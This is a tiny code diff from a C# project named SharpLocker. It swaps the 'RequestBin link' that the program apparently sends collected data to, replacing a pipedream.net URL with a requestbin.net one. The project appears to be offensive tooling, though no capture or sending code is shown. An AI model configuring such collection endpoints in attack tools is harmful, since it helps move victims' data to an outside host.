@@ -29,7 +29,7 @@ namespace SharpLocker
 
             //YOUR RequestBin link
             //format: http://requestbin.net/r/xxxxxxxx
-            url = "https://enc2hubchseosy5.m.pipedream.net";
+            url = "http://requestbin.net/r/gdsue2oz";
 
 
 
